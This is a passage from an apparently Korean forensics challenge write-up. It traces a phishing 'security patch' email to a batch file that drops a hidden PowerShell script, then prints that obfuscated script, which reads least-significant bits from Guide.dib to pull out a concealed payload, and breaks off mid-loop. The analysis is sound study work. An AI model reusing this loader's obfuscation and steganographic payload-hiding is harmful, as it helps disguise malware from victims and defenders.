  &lt;li&gt;파워쉘 스크립트 난독화로 인해 해당 코드의 상세 내용을 들여다볼 생각을 하지 못했다.
    &lt;ul&gt;
      &lt;li&gt;난독화가 되어 있는 경우, ‘주요 부분’ 에 대해 난독화를 해제해야 명확한 인과 분석이 가능하다.
        &lt;ul&gt;
          &lt;li&gt;
            &lt;p&gt;‘주요 부분’ 이란 어떤 기준으로 결정 가능한가?&lt;/p&gt;

            &lt;p&gt;→ &lt;strong&gt;해당 스크립트가 수행하는 핵심 기능에 입력되는 값이 거치는 부분&lt;/strong&gt;&lt;/p&gt;
          &lt;/li&gt;
          &lt;li&gt;
            &lt;p&gt;파워쉘 난독화 해제를 자동화할 수 있는 방법이 존재하는가?&lt;/p&gt;

            &lt;p&gt;→ 어느 정도는. 그러나 이건 디코딩된 데이터가 파워쉘에서 실행되었을 때만 가능&lt;/p&gt;

            &lt;p&gt;→ 즉 단순히 변수명과 정수값 정도를 난독화한 것(프론트엔드 보안에서 js 난독화하는 것처럼)의 복호화는 딱히 자동화할 방법이 없음&lt;/p&gt;
          &lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;!-- &lt;/div&gt; --&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;문제&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;DH회사의 신입사원 김모씨는 재택근무를 하던 도중, 사내 긴급 보안 패치와 관련된 내용이 담긴 이메일을 받게 되었다. 메일에 나와있는 방식대로 보안패치를 한 김모씨는 어느순간부터 컴퓨터가 원하지 않는 행동을 수행하는 것을 느꼈다.
김모씨는 이를 이상하게 여겨 분석을 의뢰 맡기게 되었다.&lt;/p&gt;

  &lt;p&gt;시나리오 S-4-1 문제 : Lsb의 비밀&lt;/p&gt;

&lt;/blockquote&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-접근&quot;&gt;0. 접근&lt;/h1&gt;

&lt;p&gt;FTK Imger로 작성된 이미지 파일이므로 FTK Imager를 활용해 분석했다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Basic Data Partition(3) → root → Users → Documents → em&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;보통 microsoft 쪽 응용은 사용자 폴더의 Documents 하위에 파일을 저장하는 경우가 많고, 회사에서 사용하는 메일 응용이라면 Outlook일 가능성이 높아 저기부터 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;시나리오 설명에 나온 것과 같이 보안 권고 관련 이메일 파일을 확인할 수 있었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;해당 두 메일 파일을 추출해 systools로 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%201.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;첨부된 patch guide 내부의 파일을 추출하여 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%202.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image%203.png&quot; alt=&quot;/assets/img/posts/2025-01-29-FIESTA2024-S-4-1/image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;즉, 함께 첨부된 배치 파일을 분석하는 것으로 목표가 변경되었다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-악성-파일-분석&quot;&gt;1. 악성 파일 분석&lt;/h1&gt;

&lt;p&gt;해당 배치파일을 실행한 후 hidden 속성으로 함께 드롭된 파일(powershell.ps1)을 편집용으로 열어 보면, 아래의 쉘 스크립트를 보게 된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$wqeiuyorczxasdkfjhz23xb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MTgzMDQ=&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqei1u16yorczxasdkfjhz23xb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MzA=&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqei1xca16yorczxasdkfjhz23xb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;MA==&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$aqeuijfnbzcxuiv&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;OA==&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uqiwebuibzxcuyb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ToInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqeiuyorczxasdkfjhz23xb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zeqwbeuibyxuygb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ToInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqei1u16yorczxasdkfjhz23xb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$qdwcyvbaztyfuqwehvg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ToInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqei1xca16yorczxasdkfjhz23xb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zy3evbzqvwtg487asgb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ToInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$aqeuijfnbzcxuiv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$aefnmlksadasdkljfqewornzxc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;FromBase64String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;R3VpZGUuZGli&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqeiuyorczxasdkfjhzxbme&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Text.Encoding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ASCII.GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$aefnmlksadasdkljfqewornzxc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QxDrTjYnMvLpHsKjRbWfNgZcVxSbQxWpHfJz&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Join-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Location&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$wqeiuyorczxasdkfjhzxbme&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PkVmJnLdQzThPwYsNcXfLuRsWvCdGmJbZtRp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.IO.File&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ReadAllBytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QxDrTjYnMvLpHsKjRbWfNgZcVxSbQxWpHfJz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$JbPfQrHlMkZsBxCyNdWhGtQxLuVtRqYpWtXp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sqrt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3025&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NcYpQzVtFrJdLhSkWtMxKvGsRhCtNxWpQsBd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;log10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$XrBnCdVwYsQtJkWzPrLpMfSnThXvGjRmYqVk&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;abs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QrJtFvNpBwXsLnKgUvHpRcMzLkYvGtTzScXf&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;round&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PI&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LmWtZxVpQjTsCnRyMvLpJkNxSrUtGhHfRcKs&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$JbPfQrHlMkZsBxCyNdWhGtQxLuVtRqYpWtXp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$XrBnCdVwYsQtJkWzPrLpMfSnThXvGjRmYqVk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$QrJtFvNpBwXsLnKgUvHpRcMzLkYvGtTzScXf&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$NcYpQzVtFrJdLhSkWtMxKvGsRhCtNxWpQsBd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zeqwbeuibyxuygb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$MpQsBnLjHtVrXpWdNgZkTqScRmVlPyKtWhXc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;New-Object&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;System.Collections.ArrayList&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WcTfDrGpLxJvNzMkQsYrPtVcHwBmZnKsVnRq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$qdwcyvbaztyfuqwehvg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HtRfGpLkNqMwXsPtVzYjLpScXrJwNmTpYvQr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$qdwcyvbaztyfuqwehvg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LpWqXtNzJsVcKfRvQpTdBvGhXcJkMtWrXf&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LmWtZxVpQjTsCnRyMvLpJkNxSrUtGhHfRcKs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LpWqXtNzJsVcKfRvQpTdBvGhXcJkMtWrXf&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-lt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$uqiwebuibzxcuyb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LpWqXtNzJsVcKfRvQpTdBvGhXcJkMtWrXf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$GxJnQfLkBsWrNzMpCtHyVwXkTpZyQjPtCr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PkVmJnLdQzThPwYsNcXfLuRsWvCdGmJbZtRp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$LpWqXtNzJsVcKfRvQpTdBvGhXcJkMtWrXf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-band&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WcTfDrGpLxJvNzMkQsYrPtVcHwBmZnKsVnRq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WcTfDrGpLxJvNzMkQsYrPtVcHwBmZnKsVnRq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-bor&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$GxJnQfLkBsWrNzMpCtHyVwXkTpZyQjPtCr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Pow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HtRfGpLkNqMwXsPtVzYjLpScXrJwNmTpYvQr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HtRfGpLkNqMwXsPtVzYjLpScXrJwNmTpYvQr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HtRfGpLkNqMwXsPtVzYjLpScXrJwNmTpYvQr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zy3evbzqvwtg487asgb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WcTfDrGpLxJvNzMkQsYrPtVcHwBmZnKsVnRq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$qdwcyvbaztyfuqwehvg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
